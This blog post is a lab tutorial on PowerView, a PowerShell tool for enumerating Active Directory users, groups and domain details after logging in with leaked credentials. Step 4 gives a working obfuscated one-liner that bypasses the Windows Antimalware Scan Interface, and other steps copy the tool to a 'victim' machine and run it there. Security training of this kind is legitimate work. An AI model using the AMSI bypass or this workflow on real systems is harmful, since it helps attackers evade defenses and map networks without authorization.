---
title:  "Day 53 - PowerView - 100 tools in 100 days!"
excerpt: "In this post, I will show you the tool PowerView and how it works."
mathjax: true
layout: post
categories:
    -- github
    -- website
---

1 . Introduction
<br>
2 . My Setup
<br>
3 . What is PowerView?
<br>
4 . Why use PowerView?
<br>
5 . How to use PowerView?
<br>
6 . Summary

---

## This post is designed to introduce you to the tool PowerView.

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/100%20tools/powerview/powerview0.png)

# <span style="color:red">***Disclaimer***</span> : **Please only use PowerView for professional and educational reasons. Do not use this tool for nefarious or malicious reasons.**

---

### 1. **Introduction**

Welcome to the **fifty-third** blog post of 100 tools in 100 days.<br> 

Find **PowerView** @ GitHub [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

PowerView was created by Will Schroeder (@harmj0y) find him at:

[GitHub](https://github.com/HarmJ0y)

[LinkedIn](https://www.linkedin.com/in/willschroeder/)

[Twitter](https://twitter.com/harmj0y)


---

### 2. **My Setup**

For running the PowerView tool, I used Kali Linux in a VMware Workstation 16 Player virtualized environment.

For my victim network I am running a virtualized Active Directory Domain Controller and Windows 10 Enterprise Edition user in a VMware Workstation 16 Player virtualized environment. 

---

### 3. **What is PowerView?**

PowerView is an enumeration PowerShell script which allows a user to discover and identify various aspects of an Active Directory.

---

### 4. **Why use PowerView?**

PowerView is an initial environment reconnaissance tool for security researchers. 

Reconnaissance occurs at various stages of the penetration testing process. 

This particular initial reconnaissance would be after authenticating as a user on an Active Directory domain. 

Therefore, this reconnaissance phase should not be confused with the overall initial discovery reconnaissance phase where you are determining IP addresses, domain names, and services using tools like Nmap. 

PowerView allows a researcher to find other users, domain admins, computers, groups, shares, Group Policies, domain trusts, and much more just as a regular user. 

---

### Before moving forward:

 - I am using a virtualized AD network with a Domain Controller and one user signed in. 
 - For these examples I had to relax Firewall settings.
 - I am using OpenSSH server on the users computer to connect to. 
 - Prior to this point in the attack chain I completed full enumeration of the network and gained access to leaked credentials for the user.
 - Not every active directory attack will function the same, and likely you would not find an environment where firewall solutions are relaxed.
 - I used BadBlood to automate the creation of my Active Directory, you can do the same by visiting the BadBlood page [here](https://github.com/davidprowe/BadBlood).

### 5. **How to use PowerView?**

It is important to remember that PowerView is a ps1 script that needs to be on the users device to run. I will go through the steps I took to securely copy the script to the victim device, execute the script via an SSH terminal established from leaked credentials, and some of the scripts functions that can be used for further pivoting and potential privilege escalation. 

Ensure you have [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) downloaded to your attacking device.

    Step 1:
    Securely copy the powershell script using the following command:

    scp PowerView.ps1 <USERNAME>@<DOMAIN>:<PATH TO DOWNLOAD TO>

<br>

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/100%20tools/powerview/powerview1.png)

    Step 2:
    SSH into the victim device using the leaked credentials:

    ssh <USERNAME>@<DOMAIN>

<br>

    Step 3:
    Enter the following command to upgrade to a PowerShell terminal:
    
    powershell -ep RemoteSigned

<br>

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/100%20tools/powerview/powerview1a.png)

    Step 4:
    Enter the following command to bypass Windows Antimalware:

`S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )`

<br>

You can read more about this Antimalware Scan Interface bypass [here](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/100%20tools/powerview/powerview1b.png)

    Step 5:
    Navigate to the file path where you securely copied the PowerView.ps1 file and enter the following command:

    . .\PowerView.ps1

<br>

You likely will not get a response back from executing PowerView.ps1 which is normal. 

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/100%20tools/powerview/powerview2.png)

    Step 6:
    First lets get the list of users in the environment (note if you have a lot of users this will spam your terminal):

    Get-NetUser

<br>

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/100%20tools/powerview/powerview3.png)

    Step 7:
    View the properties of the current domain by entering:

    Get-NetDomain

<br>

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/100%20tools/powerview/powerview4.png)

    Step 8:
    View members of the group "Domain Admins" by entering the following:

    Get-NetGroup

    When prompted for identity 1 enter Domain Admins

    When prompted for identity 2 press enter

<br>

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/100%20tools/powerview/powerview6.png)


### 6. **Summary**

Not all PowerView commands work for every active directory environment, however, many of the options in PowerView are a great place to start when enumerating active directory during your environment reconnaissance. 

I hope you enjoyed this blog post.

Thanks for reading!<br>

If you have suggestions for what tool to cover next, [contact](mailto:matthew.o.mccorkle@gmail.com) me!
